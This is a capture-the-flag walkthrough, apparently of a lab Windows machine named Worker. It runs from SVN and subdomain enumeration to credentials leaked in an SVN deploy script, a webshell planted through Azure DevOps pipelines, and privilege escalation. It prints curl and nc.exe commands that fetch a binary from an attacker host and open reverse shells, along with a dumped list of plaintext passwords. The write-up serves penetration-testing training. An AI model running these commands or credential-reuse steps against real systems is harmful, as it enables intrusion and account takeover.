It looks like there is an IIS server behind the port tcp-80, enumeration with whatweb:

```bash
whatweb <http://10.10.10.203> | tee technologiesServer
<http://10.10.10.203> [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.203], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

Nothing useful other than the usual technologies running on IIS Server.

We proceed to enumerate the possible subdirectories within this URL: ^1b40a0

Only “aspnet_client” seems to be a valid sub-directory, by fuzzing further into it, we found “system_web” sub-directory:

Later we find out that this is only a rabbit hole as no further enumeration was possible, and bot sub-directories are forbidden to us.

After no enumeration was possible on tcp-80 let’s go to enumerate port tcp-3690, as this is an unusual port, we need to investigate the common service running on it, for that reason we will go to our bible for basic enumeration, hacktricks (for further details refer to the link below). Here we can check for some basic commands that could help us:^90567c
```bash
svn ls svn://10.10.10.203 #list
svn log svn://10.10.10.203 #Commit history
svn checkout svn://10.10.10.203 #Download the repository
svn up -r 2 #Go to revision 2 inside the checkout folder
```
And this are the results:
```erlang
svn ls svn://10.10.10.203
**dimension.worker.htb/**
moved.txt
```
As we can see there is a virtual hosting being used, so let’s take a look into it by adding this subdomain onto our /etc/hosts file:

```erlang
GNU nano 6.3                   /etc/hosts 
# Static table lookup for hostnames.
# See hosts(5) for details.

127.0.0.1       localhost
::1             localhost

10.10.10.203    dimension.worker.htb worker.htb
```

Then we are able to access onto a hidden web page, let’s further enumerate, this time for subdomains:

```erlang
wfuzz -c -t 200 --hw 55 --hc 403,404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.worker.htb' -u <http://worker.htb/>

Let’s add all of this subdomains within the /etc/hosts:

```erlang
GNU nano 6.3                     /etc/hosts
# Static table lookup for hostnames.
# See hosts(5) for details.

127.0.0.1       localhost
::1             localhost

10.10.10.203    dimension.worker.htb worker.htb alpha.worker.htb solid-state.worker.htb alpha.worker.htb story.worker.htb cartoon.worker.htb lens.worker.htb dimension.worker.htb spectral.worker.htb twenty.worker.htb
```

# Foothold

After full enumeration on all the websites, we couldn’t identify anything so let’s go back to the svn enumeration, with this command we can download all within SVN port:

A    moved.txt
Checked out revision 5.
```

There is an interesting file called moved.txt, such file contains a new virtual host, by adding it into our /etc/hosts file we are able to see a new web page, which seems to be something from Azure DevOps:

```
GNU nano 6.3                       moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: <http://devops.worker.htb>

// The Worker team :)
```

![[Pasted image 20220707121504.png]]

Also notice that this is the “revision 5” which is somehow similar to a git commit, if we list the whole revisions, we can identify the “Added deployment script” legend:

```bash
❯ svn log svn://10.10.10.203
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 08:52:00 -0500 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 08:50:20 -0500 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 08:46:19 -0500 (Sat, 20 Jun 2020) | 1 line

------------------------------------------------------------------------
r2 | nathen | 2020-06-20 08:45:16 -0500 (Sat, 20 Jun 2020) | 1 line

**Added deployment script**
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 08:43:43 -0500 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```

If we look into our previous command we can see that all the commits are numbered and tagged, with the following command we can go to the second revision as it must have something interesting within:

```bash
svn up -r 2
Updating '.':
D    moved.txt
A    deploy.ps1
Updated to revision 2.
```

By doing this we are able to extract a new file called depĺoy.ps1:

```bash
GNU nano 6.3                  deploy.ps1
**$user = "nathen"
$plain = "wendel98"**
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Such file contains credentials that could help us to login within the application:

# Exploitation

^dfc77b

If we click the SmartHotel360 Project we’ll see the following menu, notice that the repos tab has files within which are similar to the hostnames that we peviously adde onto the /etc/hosts file:

![[Pasted image 20220707121552.png]]

Something that we can try is to upload a file .aspx and get a webshell as this is an IIS server, it will accept it and run it, for that we need to follow this steps:

-   Click on upload File(s)

![[Pasted image 20220707121628.png]]

-   Upload .aspx file as a web shell

![[Pasted image 20220707121647.png]]

As we can see, we have no permissions to directly upload the web shell with this user:

![[Pasted image 20220707121754.png]]

After investigating this error, we find that it is possible to upload a file by first pulling a request and then accepting it (if possible and if we are authorized to do it):

In first place let’s create a new branch called “test”:

![[Pasted image 20220707121809.png]]

![[Pasted image 20220707121818.png]]

After that let’s try to upload a file in this new branch:

![[Pasted image 20220707121832.png]]

Now we can see the file within the directory, but while trying to navigate to this web page (spectral.worker.htb) we find out that this is not visible:

![[Pasted image 20220707121851.png]]

Then let’s try to make a pull request as per the suggestion under the error from master branch:

![[Pasted image 20220707121913.png]]
![[Pasted image 20220707121926.png]]
Seems that it works, let’s now approve it as it seems also that we have permission to approve it with this account:

![[Pasted image 20220707121946.png]]
Then click on “Set auto-complete” to merge the changes:

![[Pasted image 20220707121958.png]]

It throws the next exception, and it seems that nothing has happened:

![[Pasted image 20220707122012.png]]

After keeping enumerating, the azure web page, we found the utility pipeline (for further details pleas refer to the resources section), which is:

![[Pasted image 20220707122027.png]]

In order to create our own pipeline we need to click on:

![[Pasted image 20220707122039.png]]

This must be done in a short period of time, otherwise the service could be broken and we need to restart again, after several tries, we finally get the pipeline queued and executed correctly:

![[Pasted image 20220707122052.png]]
After that, we’ll be able to see that the webshell is now available:

![[Pasted image 20220707122102.png]]

Little tip is to use “2>&1” flag to retrieve errors while using commands, useful to see if curl/wget are installed:

![[Pasted image 20220707122113.png]]
As curl is enabled we can retrieve a nc.exe and get a reverse shell towards our machine:

```bash
curl <http://10.10.16.5:8081/nc.exe> -o C:\\Windows\\Temp\\privesc\\nc.exe
```

![[Pasted image 20220707122127.png]]

After executing the previos message we need to start a python server:

```bash
sudo python3 -m http.server 8081
```

Then we’ll see that the file is within the choosen path, now is time to execute the reverse shell:

```bash
C:\\Windows\\Temp\\privesc\\nc.exe -e cmd 10.10.16.5 443
```

![[Pasted image 20220707122144.png]]

Do not forget to start our listener with rlwrap to get a more stable shell:

```bash
sudo rlwrap nc -lvnp 443
Connection from 10.10.10.203:51133
Microsoft Windows [Version 10.0.17763.1282]

c:\\windows\\system32\\inetsrv>
```

## User privesc

Something to notice while creating the .aspx file is where is it being stored:

![[Pasted image 20220707122159.png]]

As we can see there is a W: drive, let’s enter into it by typing “w:” under our shell:

![[Pasted image 20220707122210.png]]

After some enumeration we’ll find the following file:

```bash
W:\\svnrepos\\www\\conf>type passwd
type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

In order to get which user could be exploitable we go back to c:\\users\\ folder:

```bash
c:\\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of c:\\Users

2020-07-07  17:53    <DIR>          .
2020-07-07  17:53    <DIR>          ..
2020-03-28  15:59    <DIR>          .NET v4.5
2020-03-28  15:59    <DIR>          .NET v4.5 Classic
2020-08-18  00:33    <DIR>          Administrator
2020-03-28  15:01    <DIR>          Public
2020-07-22  01:11    <DIR>          restorer
2020-07-08  19:22    <DIR>          robisl <----
               0 File(s)              0 bytes
               8 Dir(s)  10404749312 bytes free
```

Now if we go back we can see that now we have the password for robisl:

```bash
robisl = wolves11
```

By using evil-winrm we can try to access as this user:

```bash
❯ evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\robisl\\Documents>
```

## Root privesc

At this point we should try to see if the azure application gives us more permissions with this new account by reusing credentials.

And it works, now in order to elevate privileges we’ll check what permissions do we have:

![[Pasted image 20220707122317.png]]

As we can see we have Permission as Build Administrator, this can be abused by creating a new Pipeline:

![[Pasted image 20220707122327.png]]

![[Pasted image 20220707122337.png]]

As we can see there is the possibility of execute commands, let’s take a look as which user are we executing them:

![[Pasted image 20220707122351.png]]

But while trying to execute it, we receive the following error:

![[Pasted image 20220707122417.png]]

By modifying the Pool name it should work, in order to get the pool’s name we go to the next menu:

![[Pasted image 20220707122439.png]]
Then let’s configure this Pool and try again:

![[Pasted image 20220707122450.png]]

As we can see this time the execution was correct also we get the name of the user executing the command:

![[Pasted image 20220707122550.png]]

Now let’s run a command for a reverse shell:

![[Pasted image 20220707122602.png]]

And we got root:

```bash
rlwrap nc -lvnp 1235
Connection from 10.10.10.203:50598

# Notes

Sometimes this Azure tool got stuck, it is important to always try to do it again from scratch and do it as quick as possible because it seems that is bugged and it start delete configurations that you’ve made.
